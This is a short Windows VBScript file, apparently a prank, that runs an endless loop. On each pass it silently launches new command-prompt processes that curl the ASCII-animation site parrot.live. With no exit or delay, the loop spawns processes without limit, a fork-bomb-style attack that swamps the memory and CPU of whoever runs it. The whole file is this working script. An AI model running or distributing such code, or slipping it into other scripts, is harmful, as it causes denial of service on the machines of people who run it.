While true
Dim oShell
set oShell = CreateObject ("Wscript.Shell")
Dim strArgs
strArgs = "cmd /c start cmd /c curl parrot.live"
oShell.run strArgs, 0, false
Wend
